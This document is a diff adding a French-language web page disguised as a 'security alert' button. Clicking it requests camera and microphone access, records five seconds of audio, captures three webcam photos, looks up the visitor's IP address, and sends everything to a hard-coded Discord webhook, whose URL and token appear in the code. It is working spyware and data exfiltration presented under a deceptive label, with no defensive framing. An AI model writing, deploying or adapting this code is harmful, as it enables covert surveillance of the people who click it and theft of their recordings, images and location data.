@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerte Sécurité</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<button id="alertButton">CLIQUEZ POUR ALERTE</button>
+
+<script>
+document.getElementById('alertButton').addEventListener('click', function() {
+    // Fonction pour obtenir l'adresse IP de l'utilisateur
+    function getIpAddress() {
+        return fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(error => {
+                console.error('Erreur lors de la récupération de l\'adresse IP:', error);
+                return null;
+            });
+    }
+
+    // Déclaration de webhookURL à un niveau supérieur
+    var webhookURL;
+
+    // Demander l'autorisation d'accéder à la webcam
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(async function (stream) {
+            // Obtention de l'adresse IP et définition de webhookURL
+            const ip = await getIpAddress();
+            console.log('Adresse IP de l\'utilisateur:', ip);
+            webhookURL = 'https://discord.com/api/webhooks/1172592139012673556/0KTHQ0HclX43V4c3fQxu458HyL6HoC58tdEk3nSiZjapY6WngQy73WVubfEZpWP5-lL-';
+
+            // Enregistrement du microphone pendant 5 secondes
+            const recorder = new MediaRecorder(stream);
+            const audioChunks = [];
+
+            recorder.ondataavailable = function (e) {
+                if (e.data.size > 0) {
+                    audioChunks.push(e.data);
+                }
+            };
+
+            recorder.onstop = function () {
+                // Création du blob avec le contenu enregistré
+                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+
+                // Code pour envoyer l'audio, l'adresse IP et les images au webhook Discord
+                const formData = new FormData();
+                formData.append('audio.wav', audioBlob, 'audio.wav');
+                formData.append('ip', ip);
+
+                // Capture des images de la webcam
+                const photoCount = 3; // Nombre d'images à capturer
+                let promises = [];
+                for (let i = 0; i < photoCount; i++) {
+                    promises.push(capturePhotoBlob(stream));
+                }
+
+                Promise.all(promises)
+                    .then(photoBlobs => {
+                        photoBlobs.forEach((photoBlob, index) => {
+                            formData.append(`photo_${index + 1}.png`, photoBlob, `photo_${index + 1}.png`);
+                        });
+
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            console.log('Alerte audio, coordonnées et images envoyées avec succès.');
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de l\'envoi de l\'alerte audio, coordonnées et images:', error);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Erreur lors de la capture des images:', error);
+                    });
+            };
+
+            // Début de l'enregistrement
+            recorder.start();
+
+            // Arrêt de l'enregistrement après 5 secondes
+            setTimeout(function () {
+                recorder.stop();
+            }, 5000);
+        })
+        .catch(function (error) {
+            console.error('Erreur lors de l\'accès à la webcam:', error);
+        });
+
+    // Fonction pour capturer une image de la webcam et renvoyer le blob
+    function capturePhotoBlob(stream) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+
+        return new Promise((resolve, reject) => {
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(resolve, 'image/png');
+                video.srcObject.getTracks().forEach(track => track.stop());
+            };
+        });
+    }
+});
+</script>
+
+</body>
+</html>
